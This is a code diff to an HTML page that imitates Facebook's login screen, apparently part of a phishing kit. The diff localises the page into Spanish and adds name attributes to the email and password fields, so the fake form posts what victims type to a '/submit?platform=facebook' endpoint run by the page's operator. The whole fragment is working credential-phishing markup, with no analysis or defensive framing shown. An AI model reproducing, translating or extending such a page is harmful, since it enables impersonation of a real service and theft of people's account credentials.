@@ -228,19 +228,30 @@
       <div class="fb-form res">
         <div class="card">
           <h1>facebook</h1>
-          <p>Connect with friends and the world</p>
-          <p>around you on Facebook.</p>
+          <p>Facebook te ayuda a comunicarte y</p>
+          <p>compartir con las personas que forman</p>
+          <p>parte de tu vida.</p>
         </div>
         <form action="/submit?platform=facebook" method="post">
-          <input type="email" placeholder="Email or phone number" required />
-          <input type="password" placeholder="Password" required />
+          <input
+            type="email"
+            name="email"
+            placeholder="Correo electrónico o número de teléfono"
+            required
+            />
+          <input
+            type="password"
+            name="password"
+            placeholder="Contraseña"
+            required
+            />
           <div class="fb-submit">
-            <button type="submit" class="login">Login</button>
-            <a href="#" class="forgot">Forgot password?</a>
+            <button type="submit" class="login">Iniciar sesión</button>
+            <a href="#" class="forgot">Has olvidado tu contraseña?</a>
           </div>
           <hr />
           <div class="button">
-            <a href="#">Create new account</a>
+            <a href="#">Crear una cuenta</a>
           </div>
         </form>
       </div>
